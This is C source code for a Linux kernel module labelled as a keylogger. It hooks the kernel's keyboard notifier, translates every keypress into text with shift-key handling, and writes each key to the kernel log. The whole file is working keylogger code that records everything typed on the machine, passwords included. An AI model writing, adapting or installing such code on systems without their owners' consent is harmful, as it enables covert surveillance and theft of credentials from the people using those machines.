/*
 *  A keylogger module
 */
#include <linux/module.h>   /* Needed by all modules */
#include <linux/kernel.h>   /* Needed for KERN_INFO */
#include <linux/init.h>     /* Needed for the macros */
#include <linux/keyboard.h> /* Needed for the notifier_block */
#include <linux/semaphore.h>

static struct semaphore sem;

static const char* keymapNoShift[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* keymapShiftActivated[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char** keyMap[] = {keymapNoShift, keymapShiftActivated}; 

static int shiftKeyDepressed = 0;

static struct notifier_block keylogger_nb;

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *kb_event = _param; //change from void pointer
    if (code != KBD_KEYCODE) return NOTIFY_OK; // Ignore stuff not keyboard related

    down(&sem);
    if( kb_event->value==42 || kb_event->value==54 ) { // if either shift key is pressed
        //May act funky if pressing both shift keys
        shiftKeyDepressed = kb_event->down;
    }
    if(kb_event->down) {
        //The actual logging.  Fun stuff goes here
        printk(KERN_INFO "%s\n", keyMap[shiftKeyDepressed][kb_event->value]);
    }
    up(&sem);

    return NOTIFY_OK;
}

static int __init init_keylogger(void){
    /* Register this module with the notification list maintained by the keyboard driver.
    This will cause our "keylogger_notify" function to be called upon every key press and release event. This call is non-blocking.
    */ 
    keylogger_nb.notifier_call = keylogger_notify;
    register_keyboard_notifier(&keylogger_nb);
    sema_init(&sem, 1);
    return 0;
}

static void __exit cleanup_keylogger(void){
    unregister_keyboard_notifier(&keylogger_nb);
}

module_init(init_keylogger);
module_exit(cleanup_keylogger);
//MODULE_SUPPORTED_DEVICE("Not machine dependent");
